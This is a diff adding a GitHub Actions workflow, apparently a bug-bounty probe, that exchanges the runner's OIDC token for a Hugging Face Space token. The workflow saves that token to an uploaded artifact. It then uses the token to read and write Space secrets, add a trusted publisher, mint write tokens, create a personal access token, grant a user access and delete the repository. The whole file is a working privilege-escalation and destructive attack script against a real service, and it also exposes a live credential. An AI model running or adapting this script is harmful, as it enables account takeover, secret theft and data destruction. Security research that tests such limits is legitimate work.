@@ -1,0 +1,125 @@
+name: i851 space probe
+on:
+  workflow_dispatch:
+    inputs:
+      space:
+        description: Space repo (ns/name) with an enrolled trusted publisher
+        required: true
+        type: string
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run probe
+        env:
+          SPACE: ${{ inputs.space }}
+          ART_DIR: artifact
+        run: |
+          python3 - <<'PROBE_PY'
+          # -*- coding: utf-8 -*-
+          # i851 space: privilege ceiling of a Space Trusted-Publisher-minted hf_jwt_
+          import json, os, sys, base64, hashlib, urllib.request, urllib.error
+
+          BASE = "https://huggingface.co"
+          SPACE = os.environ["SPACE"]
+          ART = os.environ.get("ART_DIR", "artifact")
+          os.makedirs(ART, exist_ok=True)
+
+          def req(method, path, token=None, cookie=None, body=None, ctype="application/json", extra=None, timeout=45):
+              h = {"User-Agent": "i851-space-probe/1.0", "Accept": "application/json"}
+              if token:  h["Authorization"] = "Bearer " + token
+              if cookie: h["Cookie"] = "token=" + cookie
+              data = None
+              if body is not None:
+                  if isinstance(body, (dict, list)):
+                      data = json.dumps(body).encode(); h["Content-Type"] = ctype
+                  else:
+                      data = str(body).encode(); h["Content-Type"] = ctype
+              if extra: h.update(extra)
+              r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode("utf-8", "replace")
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode("utf-8", "replace")
+              except Exception as e:
+                  return None, repr(e)
+
+          def log(tag, st, b, n=500):
+              print("RESULT[%s] status=%s body=%s" % (tag, st, (b or "")[:n].replace("\n", " ")))
+              return st, b
+
+          def decode(t):
+              p = t.split(".")[1]; p += "=" * (-len(p) % 4)
+              return json.loads(base64.urlsafe_b64decode(p))
+
+          u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=https%3A%2F%2Fhuggingface.co"
+          rq = urllib.request.Request(u, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
+          idtok = json.loads(urllib.request.urlopen(rq).read())["value"]
+          print("OIDC_SUB=" + decode(idtok).get("sub", ""))
+
+          body = {"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
+                  "subject_token_type": "urn:ietf:params:oauth:token-type:id_token",
+                  "subject_token": idtok, "resource": SPACE}
+          st, b = req("POST", "/oauth/token", body=body)
+          print("EXCHANGE status=%s body=%s" % (st, b[:300]))
+          try:
+              tok = json.loads(b)["access_token"]
+          except Exception:
+              print("NO_SPACE_TOKEN")
+              sys.exit(1)
+          cl = decode(tok)
+          print("MINTED_CLAIMS=" + json.dumps(cl, sort_keys=True))
+          open(os.path.join(ART, "hf_jwt_space.txt"), "w").write(tok)
+          with open(os.path.join(ART, "space_claims.json"), "w") as f:
+              json.dump(cl, f, indent=2)
+
+          ns, rn = SPACE.split("/")
+          log("whoami_bearer", *req("GET", "/api/whoami-v2", token=tok))
+          log("whoami_cookie", *req("GET", "/api/whoami-v2", cookie=tok))
+          log("space_meta", *req("GET", "/api/spaces/%s" % SPACE, token=tok))
+          log("space_tree", *req("GET", "/api/spaces/%s/tree/main" % SPACE, token=tok))
+          log("secrets_get", *req("GET", "/api/spaces/%s/secrets" % SPACE, token=tok))
+          log("secrets_get_cookie", *req("GET", "/api/spaces/%s/secrets" % SPACE, cookie=tok))
+          log("secrets_add", *req("POST", "/api/spaces/%s/secrets" % SPACE, token=tok,
+                                   body={"key": "I851_CANARY_SECRET", "value": "i851-canary"}))
+          log("secrets_delete", *req("POST", "/api/spaces/%s/secrets/delete" % SPACE, token=tok,
+                                      body={"key": "I851_CANARY_SECRET"}))
+          log("variables_get", *req("GET", "/api/spaces/%s/variables" % SPACE, token=tok))
+          log("variables_add", *req("POST", "/api/spaces/%s/variables" % SPACE, token=tok,
+                                    body={"key": "I851_CANARY_VAR", "value": "i851-canary"}))
+          log("variables_delete", *req("POST", "/api/spaces/%s/variables/delete" % SPACE, token=tok,
+                                       body={"key": "I851_CANARY_VAR"}))
+          log("settings_put_private", *req("PUT", "/api/spaces/%s/settings" % SPACE, token=tok, body={"private": True}))
+          log("restart", *req("POST", "/api/spaces/%s/restart" % SPACE, token=tok, body={}))
+          log("tp_list", *req("GET", "/api/spaces/%s/settings/trusted-publishers" % SPACE, token=tok))
+          log("tp_add", *req("POST", "/api/spaces/%s/settings/trusted-publishers" % SPACE, token=tok,
+                             body={"issuerUrl": "https://gitlab.com", "claims": {"sub": {"kind": "eq", "value": "i851"}}}))
+          log("xet_write_token", *req("GET", "/api/spaces/%s/xet-write-token/main" % SPACE, token=tok))
+          log("jwt_mint", *req("GET", "/api/spaces/%s/jwt" % SPACE, token=tok))
+          oid = hashlib.sha256(b"i851-space-lfs").hexdigest()
+          log("lfs_batch_upload", *req("POST", "/%s.git/info/lfs/objects/batch" % SPACE, token=tok,
+                                        body={"operation": "upload", "transfers": ["basic"],
+                                              "objects": [{"oid": oid, "size": 16}]}))
+          log("logs_run", *req("GET", "/api/spaces/%s/logs/run" % SPACE, token=tok))
+          log("access_grant_noop", *req("POST", "/api/spaces/%s/user-access-request/grant" % SPACE, token=tok,
+                                        body={"user": "h1testrightmeow"}))
+          log("pat_create_form", *req("POST", "/api/settings/tokens", token=tok,
+                                       body="role=write&displayName=i851-space",
+                                       ctype="application/x-www-form-urlencoded",
+                                       extra={"Origin": "https://huggingface.co"}))
+          log("repo_delete", *req("POST", "/api/repos/delete", token=tok,
+                                  body={"type": "space", "name": SPACE}))
+          # cross-resource check: same token against a model repo
+          log("scope_other_model", *req("GET", "/api/models/h1testrightmeow/i851-leftover-moved-1794210186/settings/trusted-publishers", token=tok))
+          print("SPACE_PROBE_DONE")
+          PROBE_PY
+      - name: upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i851-space-results
+          path: artifact/
